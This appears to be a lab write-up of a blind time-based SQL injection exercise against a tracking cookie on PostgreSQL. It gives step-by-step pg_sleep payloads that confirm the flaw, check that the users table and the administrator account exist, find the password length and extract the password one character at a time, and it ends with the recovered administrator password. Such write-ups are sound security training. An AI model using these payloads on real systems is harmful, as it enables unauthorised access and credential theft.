Vulnerable parameter - tracking cookie

Goals:
1- Display the administrator password
2- Login as the administrator user

Analysis:
--------

Step #1: Confirm that the parameter is vulnerable to blind SQL injection
' || (SELECT pg_sleep(10))--

The parameter is vulnerable to blind SQL injection

Step #2: Confirm that the users table exists in the database
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--

The users table exists in the database

Step #3: Confirm that the username administrator exists in the users table
' || (SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--

The username administrator exists in the users table

Step #4: Determine the length of the administrator password
' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
-> The length of the password is greater than 1

' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 10) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
-> The length of the password is greater than 10

' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 15) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
-> The length of the password is greater than 15

' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) > 20) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
-> The length of the password is less than or equal to 20

' || (SELECT CASE WHEN (username = 'administrator' AND LENGTH(password) = 20) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
-> The length of the password is 20 character

Step #5: Display the administrator password
' || (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--

Do this until you find all the character in the password

note: You could use the Intruder from Burp Suite to do this or script it.

Step #6: Login as the administrator user

Username: administrator
Password: 4y60qvq2zmijzcn40kjv
